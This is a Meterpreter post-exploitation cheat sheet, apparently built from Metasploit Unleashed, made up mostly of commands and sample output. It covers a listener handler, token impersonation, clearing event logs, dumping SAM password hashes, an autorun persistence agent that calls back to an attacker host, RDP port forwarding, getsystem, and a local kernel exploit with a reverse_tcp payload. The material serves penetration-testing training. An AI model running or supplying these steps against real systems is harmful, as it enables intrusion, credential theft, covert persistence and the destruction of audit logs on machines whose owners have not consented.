Meterpreter

[ + ] Meterpreter Basics.
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

[ + ] Setting up a handler.
use exploit/multi/handler
show payloads
Find your meterpreter payload to listen for.

[ + ] Change directory on both victim and attacking machines.
--> Local Change Directory (Attacking Machine):
lcd /localDir/
--> Change directory in your shell (Vitim Machine):
cd

[ + ] Token Impersonation:
https://www.offensive-security.com/metasploit-unleashed/fun-incognito/

meterpreter> use incognito
Loading extension incognito...success.
meterpreter> help

Incognito Commands
==================

    Command              Description                                             
    -------              -----------                                             
    add_group_user       Attempt to add a user to a global group with all tokens 
    add_localgroup_user  Attempt to add a user to a local group with all tokens  
    add_user             Attempt to add a user with all tokens                   
    impersonate_token    Impersonate specified token                             
    list_tokens          List tokens available under current user context        
    snarf_hashes         Snarf challenge/response hashes for every token         

meterpreter>

"What we will need to do first is identify if there are any valid tokens on this system. Depending on the level of access that your exploit provides, you are limited in the tokens you are able to view. When it comes to token stealing, SYSTEM is king. As SYSTEM, you are allowed to see and use any token on the box."

--> Pro Tip - Administrators don’t have access to all the tokens either, but they do have the ability to migrate to SYSTEM processes, effectively making them SYSTEM and able to see all the tokens available.

meterpreter> list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter>

meterpreter> impersonate_token SNEAKS.IN\\Administrator
[+] Delegation token available
[+] Successfully impersonated user SNEAKS.IN\Administrator
meterpreter> getuid
Server username: SNEAKS.IN\Administrator
meterpreter>

meterpreter> shell
Process 2804 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> whoami
whoami
SNEAKS.IN\administrator

C:\WINDOWS\system32>

Done!


[ + ] Is it possible for me to run an exploit through meterpreter as a background job?
--> Yup.
meterpreter> run -j
[*] Exploit running as background job.


[ + ] Lets clear our tracks.

meterpreter> clearev
[*] Wiping 97 records from Application...
[*] Wiping 415 records from System...
[*] Wiping 0 records from Security...
meterpreter>

Nice.

[ + ] File Transfer:

meterpreter> download C:\\boot.ini
[*] downloading: C:\boot.ini -> C:\boot.ini
[*] downloaded : C:\boot.ini -> C:\boot.ini/boot.ini
meterpreter>

Similarly, we can perform uploads to the target system with the 'upload' command. This will expect an absolute path on your local file system to the file you wish you transfer over.

+ How can I execute something on the target machine?

meterpreter> execute -f cmd.exe -i -H
Process 38320 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

In this case, we execute cmd.exe on the target machine and specify that we want to interact with the process.

[ + ] Lets dump some hashes from the SAM Database.

meterpreter> run post/windows/gather/hashdump 

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...

Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
meterpreter>

Or you can just type hashdump...


[ + ] Migrate to a more stable process.

meterpreter> run post/windows/manage/migrate 

[*] Running module against V-MAC-XP
[*] Current server process: svchost.exe (1076)
[*] Migrating to explorer.exe...
[*] Migrating into process ID 816
[*] New server process: Explorer.EXE (816)
meterpreter>

You can also specify to migrate to some PID. For example - use cmd.exe to open notepad and then grab the PID to migrate to it with: migrate <PID>

[ + ] Lets Install a persistent service.

meterpreter> run persistence -U -i 5 -p 443 -r <LHOST>
[*] Creating a persistent agent: LHOST=LHOST LPORT=443 (interval=5 onboot=true)
[*] Persistent agent script is 613976 bytes long
[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
[*] Agent executed with PID 492
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
meterpreter>

"We will configure our persistent Meterpreter session to wait until a user logs on to the remote system and try to connect back to our listener every 5 seconds at IP address <LHOST> on port 443."
https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/


[ + ] Can we forward out a local port with meterpreter to 0.0.0.0 on our attacking machine?
--> Yup.

meterpreter> portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
     -L >opt>  The local host to listen on (optional).
     -h        Help banner.
     -l >opt>  The local port to listen on.
     -p >opt>  The remote port to connect on.
     -r >opt>  The remote host to connect on.
meterpreter>

[ + ] Lets forward out the RDP Service on the Victim Machine! For fun?
https://www.offensive-security.com/metasploit-unleashed/portfwd/

meterpreter> portfwd add –l 3389 –p 3389 –r <TARGET IP>
[*] Local TCP relay created: 0.0.0.0:3389 >-> <TARGET IP>:3389
meterpreter> 

--> Then, on your attacking machine:
rdesktop 0.0.0.0


+ Privilege Escalation with Meterpreter?
https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

--> priv

meterpreter> use priv
Loading extension priv...success.
meterpreter>


--> getsystem

meterpreter> getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter>



[ + ] Local Exploits

meterpreter> background
[*] Backgrounding session 1...
msf exploit(ms10_002_aurora)> use exploit/windows/local/
...snip...
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
...snip...
use exploit/windows/local/ms10_015_kitrap0d
use exploit/windows/local/ms10_092_schelevator
use exploit/windows/local/ms11_080_afdjoinleaf
use exploit/windows/local/ms13_005_hwnd_broadcast
use exploit/windows/local/ms13_081_track_popup_menu
...snip...
msf exploit(ms10_002_aurora)>

Example:

msf exploit(ms10_002_aurora)> use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d)> set SESSION 1
msf exploit(ms10_015_kitrap0d)> set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms10_015_kitrap0d)> set LHOST 192.168.1.5
msf exploit(ms10_015_kitrap0d)> set LPORT 4443
msf exploit(ms10_015_kitrap0d)> show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     192.168.1.5      yes       The listen address
   LPORT     4443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf exploit(ms10_015_kitrap0d) > exploit

[*]  Started reverse handler on 192.168.1.161:4443 
[*]  Launching notepad to host the exploit...
[+]  Process 4048 launched.
[*]  Reflectively injecting the exploit DLL into 4048...
[*]  Injecting exploit into 4048 ...
[*]  Exploit injected. Injecting payload into 4048...
[*]  Payload injected. Executing exploit...
[+]  Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*]  Sending stage (769024 bytes) to 192.168.1.71
[*]  Meterpreter session 2 opened (192.168.1.161:4443 -> 192.168.1.71:49204) at 2014-03-11 11:14:00 -0400

meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter>


Nice.


[ + ] Windows / Linux Post Modules (Meterpreter Enumeration)
https://www.offensive-security.com/metasploit-unleashed/post-module-reference/

[ + ] Not gonna lie, just check this out: for Windows Post:
https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/

[ + ] Same applies for Linux Post:
https://www.offensive-security.com/metasploit-unleashed/linux-post-gather-modules/

[ + ] Interested in Powershell and Meterpreter?
https://www.trustedsec.com/blog/interactive-powershell-sessions-within-meterpreter/